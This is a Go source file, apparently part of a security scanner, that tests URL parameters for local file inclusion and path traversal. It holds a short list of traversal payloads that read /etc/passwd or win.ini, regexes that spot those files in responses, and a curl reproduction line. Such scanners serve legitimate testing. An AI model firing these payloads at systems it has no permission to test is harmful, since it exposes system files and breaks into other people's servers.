// Package lfi detects local file inclusion / path traversal by requesting a few
// classic traversal sequences and matching the unmistakable signature of a system
// file (the /etc/passwd layout or a Windows .ini). It reads a file to prove the
// flaw; it does not go looking for sensitive data beyond that proof.
package lfi

import (
	"context"
	"net/url"
	"regexp"

	"github.com/talkdedsec/tlk-huntx/internal/fetch"
	"github.com/talkdedsec/tlk-huntx/internal/finding"
)

var payloads = []string{
	"../../../../../../etc/passwd",
	"....//....//....//....//etc/passwd",
	"..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
	"/etc/passwd",
	"..\\..\\..\\..\\windows\\win.ini",
}

var (
	unixPasswd = regexp.MustCompile(`root:.*:0:0:`)
	winIni     = regexp.MustCompile(`(?i)\[(fonts|extensions|mci extensions)\]`)
)

func Test(ctx context.Context, c *fetch.Client, rawurl string, extra []string) []finding.Finding {
	u, err := url.Parse(rawurl)
	if err != nil {
		return nil
	}
	q := u.Query()
	names := map[string]bool{}
	for name := range q {
		names[name] = true
	}
	for _, name := range extra {
		if name != "" {
			names[name] = true
		}
	}
	if len(names) == 0 {
		return nil
	}

	var out []finding.Finding
	for name := range names {
		if f, ok := testParam(ctx, c, u, q, name); ok {
			out = append(out, f)
		}
	}
	return out
}

func testParam(ctx context.Context, c *fetch.Client, base *url.URL, q url.Values, name string) (finding.Finding, bool) {
	for _, p := range payloads {
		target := withParam(base, q, name, p)
		resp, err := c.Do(ctx, "GET", target, nil)
		if err != nil || resp == nil || resp.DryRun {
			continue
		}
		body := string(resp.Body)
		which := ""
		if unixPasswd.MatchString(body) {
			which = "/etc/passwd"
		} else if winIni.MatchString(body) {
			which = "windows .ini"
		}
		if which == "" {
			continue
		}
		f := finding.Finding{
			Target:     base.String(),
			Type:       "Local file inclusion / path traversal",
			TemplateID: "lfi",
			Severity:   finding.High,
			Confidence: 90,
			Verified:   true,
			MatchedAt:  target,
			CWE:        "CWE-22",
			Extracted:  map[string]string{"parameter": name, "file": which},
			Evidence:   finding.Evidence{Request: "GET " + target, Response: "read " + which},
			Repro:      "curl -s " + target,
		}
		f.Finalize([]string{name})
		return f, true
	}
	return finding.Finding{}, false
}

func withParam(base *url.URL, q url.Values, name, value string) string {
	cp := url.Values{}
	for k, vs := range q {
		cp[k] = append([]string(nil), vs...)
	}
	cp.Set(name, value)
	u := *base
	u.RawQuery = cp.Encode()
	return u.String()
}
